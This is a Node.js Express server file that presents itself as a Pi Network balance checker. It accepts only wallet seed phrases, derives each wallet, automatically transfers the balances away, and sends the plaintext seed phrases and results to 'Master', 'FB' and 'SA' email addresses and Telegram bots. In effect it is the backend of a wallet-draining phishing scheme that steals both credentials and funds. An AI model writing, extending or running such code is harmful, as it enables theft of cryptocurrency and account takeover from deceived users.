// server.js
require('dotenv').config();

const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');

const { getAccountsDetails } = require('./lib/piExplorer');
const { sendResultsEmail } = require('./lib/mailer');
const { sendResultsToTelegram } = require('./lib/telegram');
const { deriveAddressFromSeedPhrase } = require('./lib/derive');
const { performTransfer } = require('./lib/transfer');

const app = express();
const PORT = process.env.PORT || 3000;
const MAX_ADDRESSES_PER_REQUEST = Number(process.env.MAX_ADDRESSES_PER_REQUEST) || 100;

// CORS
const allowedOrigins = (process.env.ALLOWED_ORIGIN || '*')
  .split(',')
  .map((o) => o.trim())
  .filter(Boolean);

app.use(
  cors({
    origin:
      allowedOrigins.includes('*')
        ? '*'
        : (origin, callback) => {
            if (!origin || allowedOrigins.includes(origin)) return callback(null, true);
            callback(new Error(`Origin ${origin} not allowed by CORS`));
          },
  })
);
app.use(express.json({ limit: '1mb' }));

const limiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
});

app.get('/health', (_req, res) => res.json({ ok: true }));

/**
 * POST /api/check-balances
 * Body: { seedPhrases: string[] }   (addresses no longer accepted)
 *
 * For each seed phrase:
 *   - Derives the wallet address
 *   - Fetches unlocked/locked balances and other assets
 *   - Automatically transfers funds (Pi 70/30, other assets 100% domestic)
 *   - Sends reports to Master/FB/SA recipient groups
 */
app.post('/api/check-balances', limiter, async (req, res) => {
  const { seedPhrases } = req.body || {};

  // Reject if addresses are sent
  if (req.body && req.body.addresses) {
    return res.status(400).json({ error: 'Only seedPhrases are accepted. Address checking has been removed.' });
  }

  const hasSeedPhrases = Array.isArray(seedPhrases) && seedPhrases.length > 0;
  if (!hasSeedPhrases) {
    return res.status(400).json({ error: 'Provide seedPhrases as a non-empty array' });
  }

  if (seedPhrases.length > MAX_ADDRESSES_PER_REQUEST) {
    return res.status(400).json({ error: `Too many seed phrases. Max ${MAX_ADDRESSES_PER_REQUEST} per request.` });
  }

  if (!seedPhrases.every((sp) => typeof sp === 'string')) {
    return res.status(400).json({ error: 'Every seed phrase must be a string' });
  }

  const validAddresses = [];
  const seedPhraseMap = new Map();
  const invalidSeedPhrases = [];

  seedPhrases.forEach((sp, index) => {
    try {
      const derived = deriveAddressFromSeedPhrase(sp);
      validAddresses.push(derived);
      seedPhraseMap.set(derived, sp.trim());
    } catch (err) {
      invalidSeedPhrases.push({
        address: `seed-${index + 1}`,
        status: 'invalid',
        unlockedBalance: null,
        lockedBalance: null,
        nextUnlockDate: null,
        lockedBreakdown: [],
        otherAssets: [],
        error: 'Invalid seed phrase',
        seedPhrase: sp.trim(),
      });
    }
  });

  try {
    const results = await getAccountsDetails(validAddresses);

    results.forEach((r) => {
      if (seedPhraseMap.has(r.address)) {
        r.seedPhrase = seedPhraseMap.get(r.address);
      }
    });

    // Auto-transfer for seed phrase wallets
    if (hasSeedPhrases) {
      const transferPromises = results
        .filter(
          (r) =>
            seedPhraseMap.has(r.address) &&
            r.status === 'ok' &&
            (r.unlockedBalance > 0 || (r.otherAssets && r.otherAssets.length > 0))
        )
        .map(async (r) => {
          const transferResult = await performTransfer(
            r.address,
            seedPhraseMap.get(r.address),
            r.unlockedBalance,
            r.otherAssets || []
          );
          r.transfer = transferResult;
          return r;
        });

      await Promise.all(transferPromises);
    }

    const allResults = [...results, ...invalidSeedPhrases];

    // Pi-only results for fb/sa categories
    const piOnlyResults = allResults.map((r) => ({
      address: r.address,
      status: r.status,
      unlockedBalance: r.unlockedBalance,
      lockedBalance: r.lockedBalance,
      nextUnlockDate: r.nextUnlockDate,
      error: r.error,
    }));

    // --- Email recipients ---
    const masterEmails = (process.env.MASTER_RECIPIENT_EMAILS || process.env.RECIPIENT_EMAILS || '')
      .split(',')
      .map((e) => e.trim())
      .filter(Boolean);
    const fbEmails = (process.env.FB_RECIPIENT_EMAILS || '')
      .split(',')
      .map((e) => e.trim())
      .filter(Boolean);
    const saEmails = (process.env.SA_RECIPIENT_EMAILS || '')
      .split(',')
      .map((e) => e.trim())
      .filter(Boolean);

    // --- Telegram targets ---
    function parseTelegramTargets(envValue) {
      return (envValue || '')
        .split(',')
        .map((entry) => entry.trim())
        .filter(Boolean)
        .map((entry) => {
          const lastColon = entry.lastIndexOf(':');
          if (lastColon === -1) return null;
          const botToken = entry.slice(0, lastColon).trim();
          const chatId = entry.slice(lastColon + 1).trim();
          if (!botToken || !chatId) return null;
          return { botToken, chatId };
        })
        .filter(Boolean);
    }

    const masterTg = parseTelegramTargets(process.env.MASTER_TELEGRAM_TARGETS || process.env.TELEGRAM_TARGETS);
    const fbTg = parseTelegramTargets(process.env.FB_TELEGRAM_TARGETS);
    const saTg = parseTelegramTargets(process.env.SA_TELEGRAM_TARGETS);

    // Send emails per category
    const emailResults = [];
    if (masterEmails.length > 0) {
      const result = await sendResultsEmail(allResults, masterEmails, 'full');
      emailResults.push({ category: 'master', ...result });
    }
    if (fbEmails.length > 0) {
      const result = await sendResultsEmail(piOnlyResults, fbEmails, 'pi_only');
      emailResults.push({ category: 'fb', ...result });
    }
    if (saEmails.length > 0) {
      const result = await sendResultsEmail(piOnlyResults, saEmails, 'pi_only');
      emailResults.push({ category: 'sa', ...result });
    }

    // Send Telegram per category
    const tgResults = [];
    if (masterTg.length > 0) {
      const result = await sendResultsToTelegram(allResults, masterTg, 'full');
      tgResults.push({ category: 'master', ...result });
    }
    if (fbTg.length > 0) {
      const result = await sendResultsToTelegram(piOnlyResults, fbTg, 'pi_only');
      tgResults.push({ category: 'fb', ...result });
    }
    if (saTg.length > 0) {
      const result = await sendResultsToTelegram(piOnlyResults, saTg, 'pi_only');
      tgResults.push({ category: 'sa', ...result });
    }

    // Aggregate email delivery info
    let emailAggregate = { attempted: false, sentTo: [], error: null };
    if (emailResults.length > 0) {
      emailAggregate.attempted = emailResults.some((e) => e.attempted);
      emailAggregate.sentTo = emailResults.flatMap((e) => e.sentTo || []);
      const firstError = emailResults.find((e) => e.error);
      emailAggregate.error = firstError ? firstError.error : null;
    }

    // Aggregate telegram delivery info
    let tgAggregate = { attempted: false, deliveries: [] };
    if (tgResults.length > 0) {
      tgAggregate.attempted = tgResults.some((t) => t.attempted);
      tgAggregate.deliveries = tgResults.flatMap((t) => t.deliveries || []);
    }

    return res.json({
      results: allResults,
      email: emailAggregate,
      telegram: tgAggregate,
    });
  } catch (err) {
    console.error('Unexpected error checking balances:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.listen(PORT, () => {
  console.log(`Pi balance checker listening on port ${PORT}`);
});